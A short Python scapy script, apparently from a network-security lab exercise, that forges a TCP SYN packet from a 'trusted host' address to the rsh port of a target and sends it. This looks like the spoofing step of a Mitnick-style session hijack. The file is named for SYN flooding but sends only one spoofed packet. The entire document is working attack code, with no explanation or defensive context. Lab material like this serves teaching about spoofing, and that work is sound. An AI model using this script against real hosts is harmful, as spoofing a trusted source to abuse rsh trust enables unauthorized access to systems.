# syn_flooding.py
from scapy.all import *

# Spoofing SYN packet from trusted host to target
jeytha_ip = IP(src="10.9.0.5", dst="10.9.0.6")
venktcp = TCP(sport=1023, dport=514, flags="S", seq=778933536)
packet = jeytha_ip/venktcp

print("Sending spoofed SYN packet...")
send(packet, verbose=0)
